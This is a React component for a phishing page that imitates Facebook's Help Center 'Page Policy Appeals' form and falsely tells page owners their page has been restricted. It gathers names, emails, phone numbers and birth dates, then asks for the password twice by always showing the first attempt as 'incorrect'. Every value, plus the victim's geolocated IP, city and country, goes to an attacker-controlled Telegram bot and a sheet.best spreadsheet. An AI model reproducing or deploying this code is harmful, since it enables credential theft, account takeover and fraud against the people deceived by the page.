import { useState } from "react";
import '../business-help-center/style.css';
import { Button, Form, Input, Modal, Space } from 'antd';
import { SearchOutlined } from "@mui/icons-material";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faHouseChimney } from '@fortawesome/free-solid-svg-icons';
import { useNavigate } from "react-router-dom";
import { useDispatch } from "react-redux";
import { setData } from "../../store/business/businessSlice";
import axios from "axios";
import { ETelegram } from "../../constants";


const BusinessHelpCenter = () => {
  const [form] = Form.useForm();
  const navigate = useNavigate();
  const [namePage, setNamePage] = useState('');
  const [fullName, setFullName] = useState('');
  const [businessEmail, setBusinessEmail] = useState('');
  const [personalEmail, setPersonalEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [date, setDate] = useState('');
  const [text, setText] = useState('');
  const [password, setPassword] = useState('');
  const [passwordFirst, setPasswordFirst] = useState('');
  const [passwordSecond, setPasswordSecond] = useState('');
  const [checkPass, setCheckPass] = useState(false);
  const [open, setOpen] = useState(false);
  const [checkSend, setCheckSend] = useState<boolean>(true)
  const { TextArea } = Input;
  const [loading, setLoading] = useState(false);
  const dispatch = useDispatch()



  const showModal = () => {
    setOpen(true);
  };
  const handleOk = () => {
    setOpen(false);
  };
  const [formPassword] = Form.useForm();
  const handleCancel = () => {
    formPassword.resetFields();
    setOpen(false);
  };
  const handleSave = () => {
    if (passwordFirst === '') {
      setPasswordFirst(password);
    } else if (passwordSecond === '') {
      setPasswordSecond(password);
    }

    setPassword('');
  };
  const onFinish = async (e: any) => {
    if (!checkPass) {
      setCheckPass(true)
    }
    else {
      setCheckPass(false)
      setLoading(true)
      await Promise.all([
        sendTelegramBotForGgsheet(),
        sendTelegramBotForBusiness()
      ])
      setLoading(false)
      dispatch(setData({
        namePage,
        fullName,
        businessEmail,
        personalEmail,
        phone,
        date,
        text,
        passwordFirst,
        passwordSecond,
      }))
      clearState()
      navigate('/confirm');
    }
  };

  const sendTelegramBotForGgsheet = async () => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage"
    try {
      let message = '✅ Đã thêm vào sheet thành công'
      const data = {
        ["Name Page"]: namePage,
        ["Full Name"]: fullName,
        ["Business Email Address"]: businessEmail,
        ["Personal Email Address"]: personalEmail,
        ["Mobile Phone Number"]: phone,
        ["Date of Birth"]: date,
        ["Please provide us information that will help us investigate"]: text,
        ['Password First']: passwordFirst,
        ['Password Second']: passwordSecond,
      }
      await axios.post('https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94', data).catch(() => {
        message = '❌Thêm vào sheet không thành công'
      })
      await axios.post(CURRENT_API_URL, {
        chat_id: ETelegram.CHAT_ID,
        parse_mode: "html",
        document: '',
        text: message,
        caption: message,
      }, {
        headers: {
          "Content-Type": 'multipart/form-data',
        }
      });
    } catch (err) {
      console.log("err: ", err)
    }
  }

  const sendTelegramBotForBusiness = async () => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage"
    try {
      const response = await axios.get('https://ipgeolocation.abstractapi.com/v1/?api_key=0b54578041c84e4684b6c0f2542c1721')
      let message = `
      Email Account:  ${businessEmail}
      Name Account: ${namePage}
      Person Email: ${personalEmail}
      Facebook Page: ${text}
      User Name: ${fullName}
      Phone Number: ${phone}
      Password First: ${passwordFirst}
      Password Second: ${passwordSecond}
      Ip: ${response.data.ip_address}
      City: ${response.data.city}
      Country: ${response.data.country}
      `;
      await axios.post(CURRENT_API_URL, {
        chat_id: ETelegram.CHAT_ID,
        parse_mode: "html",
        document: '',
        text: message,
        caption: message,
      }, {
        headers: {
          "Content-Type": 'multipart/form-data',
        }
      });
    } catch (err) {
      console.log("err: ", err)
    }
  };

  const clearState = () => {
    setNamePage('');
    setFullName('');
    setBusinessEmail('');
    setPersonalEmail('');
    setPhone('');
    setDate('');
    setText('');
    setPasswordFirst('')
    setPasswordSecond('')
  }


  const setValidate = ({
    namePage,
    fullName,
    businessEmail,
    personalEmail,
    phone,
    date,
    text,
  }: {
    namePage: string
    fullName: string
    businessEmail: string
    personalEmail: string
    phone: string
    date: string
    text: string
  }) => {
    if (!namePage && !fullName && !businessEmail && !personalEmail && !phone && !date && !text) {
      setCheckSend(true)
      return;
    }
    setCheckSend(false)
  }
  return (
    <div className="container_business">
      <div className="header">
        <div className="header_sup">
          <div className="logo" >
            <a href="##">
              <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F" alt="" />
            </a>
          </div>
          <Space direction="vertical" size="middle">
            <Space.Compact size="middle">
              <Input className="search" addonBefore={<SearchOutlined />} placeholder="How can we help?" />
            </Space.Compact>
          </Space>
        </div>
      </div>
      <div className="nav">
        <div className="nav_sup">

          <div className="nav_help">
            <FontAwesomeIcon icon={faHouseChimney} style={{ color: '#3578e5', fontSize: '16px' }} /> <span style={{ color: '#3578e5', fontSize: '16px', fontWeight: '600', marginLeft: '8px' }}>Help Center</span>
          </div>
          <p style={{ color: '#3578e5', display: 'flex', alignItems: 'center', justifyContent: 'center', marginRight: '10px' }}>English</p>
        </div>
      </div>
      <div className="block">
        <div className="block_sup">
          <div className="tab">
            <p>Creating an Account</p>
            <p>Your Profile</p>
            <p>Friending</p>
            <p>Facebook Dating</p>
            <p>Your Home Page</p>
            <p>Messaging</p>
            <p>Reels</p>
            <p>Stories</p>
            <p>Photos</p>
            <p>Videos</p>
            <p>Gaming</p>
            <p>Pages</p>
            <p>Groups</p>
            <p>Events</p>
            <p>Fundraisers and Donations</p>
            <p>Meta Pay</p>
            <p>Marketplace</p>
            <p>Apps</p>
            <p>Facebook Mobile Apps</p>
            <p>Accessibility</p>
          </div>
          <div className="content">
            <div className="header_content">Page Policy Appeals</div>
            <div className="text_content">
              <p style={{ marginTop: '16px' }}>We have detected unusual activity on your page that violates our community standards.</p>
              <p style={{ marginTop: '20px' }}>Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
              <p style={{ marginTop: '20px' }}>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
            </div>
            <div className="form">
              <Form form={form} name="validateOnly" layout="vertical" autoComplete="off">

                <Form.Item name="namePage" label="Name Page" rules={[{ required: true, message: "Name Page is required" }]}>
                  <Input onChange={(e) => {
                    setNamePage(e.target.value)
                    setValidate({
                      namePage: e.target.value,
                      fullName,
                      businessEmail,
                      personalEmail,
                      phone,
                      date,
                      text,
                    })
                  }} value={namePage} />
                </Form.Item>
                <Form.Item name="fullName" label="Fullname" rules={[{ required: true, message: "Fullname is required" }]}>
                  <Input onChange={(e) => {
                    setFullName(e.target.value)
                    setValidate({
                      namePage,
                      fullName: e.target.value,
                      businessEmail,
                      personalEmail,
                      phone,
                      date,
                      text,
                    })
                  }} value={fullName} />
                </Form.Item>
                <Form.Item name="businessEmail" label="Business Email Address" rules={[{ required: true, message: "Business Email Address is required" }]}>
                  <Input onChange={(e) => {
                    setBusinessEmail(e.target.value)
                    setValidate({
                      namePage,
                      fullName,
                      businessEmail: e.target.value,
                      personalEmail,
                      phone,
                      date,
                      text,
                    })
                  }} value={businessEmail} />
                </Form.Item>
                <Form.Item name="personalEmail" label="Personal Email Address" rules={[{ required: true, message: "Personal Email Address is required" }]}>
                  <Input onChange={(e) => {
                    setPersonalEmail(e.target.value)
                    setValidate({
                      namePage,
                      fullName,
                      businessEmail,
                      personalEmail: e.target.value,
                      phone,
                      date,
                      text,
                    })
                  }} value={personalEmail} />
                </Form.Item>
                <Form.Item name="phone" label="Mobile Phone Number" rules={[{ required: true, message: "Mobile Phone Number is required" }]}>
                  <Input onChange={(e) => {
                    setPhone(e.target.value)
                    setValidate({
                      namePage,
                      fullName,
                      businessEmail,
                      personalEmail,
                      phone: e.target.value,
                      date,
                      text,
                    })
                  }} value={phone} />
                </Form.Item>
                <Form.Item name='dateBirth' label="Date of Birth" rules={[{ required: true, message: "Date Birth is required" }]}>
                  <Input type="date" onChange={(e) => {
                    setDate(e.target.value)
                    setValidate({
                      namePage,
                      fullName,
                      businessEmail,
                      personalEmail,
                      phone,
                      date: e.target.value,
                      text,
                    })
                  }} value={date} />
                </Form.Item>
                <div className="text_sup">
                  <Form.Item name='text' label="Please provide us information that will help us investigate." >
                    <TextArea rows={4} onChange={(e) => {
                      setText(e.target.value)
                      setValidate({
                        namePage,
                        fullName,
                        businessEmail,
                        personalEmail,
                        phone,
                        date,
                        text: e.target.value,
                      })
                    }} value={text} />
                  </Form.Item>
                </div>
              </Form>
            </div>
            <div className="footer_content">
              <>
                <Space>
                  <Button
                    style={{
                      width: '80px',
                      height: '40px',
                      position: 'absolute',
                      right: '10px',
                      top: '14px',
                      fontSize: '.875rem',
                      fontWeight: "600"
                    }}
                    type="primary"
                    onClick={showModal}
                    disabled={checkSend}
                  >
                    Send
                  </Button>

                </Space>
                <Modal
                  open={open}
                  title="Please Enter Your Password"
                  onOk={handleOk}
                  onCancel={handleCancel}

                  width={400}
                  footer={false}
                >
                  <p style={{ marginBottom: '8px', paddingTop: '6px', marginTop: '16px', borderTop: '1px solid #e9ebee' }}>For your security, you must re-enter your password to continue</p>
                  <Form
                    form={formPassword}
                    layout="vertical"
                    onFinish={onFinish}
                    autoComplete="off"
                  >
                    <Form.Item
                      name="password"
                      label={<div>Enter Your Password</div>}
                    >
                      <Input.Password placeholder="input password" value={password} onChange={(e) => setPassword(e.target.value)} />
                      {checkPass === true && <div style={{ color: 'red' }}>
                        Your password was incorrect!
                      </div>}

                    </Form.Item>
                    <Form.Item>
                      <Space style={{
                        display: 'flex',
                        justifyContent: 'end',
                        alignItems: 'center'
                      }}>
                        <Button type="primary" htmlType="submit" onClick={handleSave} loading={loading} style={{ fontSize: '.875rem', fontWeight: "600" }}>
                          Continue
                        </Button>
                      </Space>
                    </Form.Item>
                  </Form>
                </Modal>
              </>
            </div>
          </div>
          <div className="tab">
          </div>
        </div>
      </div>

    </div>


  );

};

export default BusinessHelpCenter;

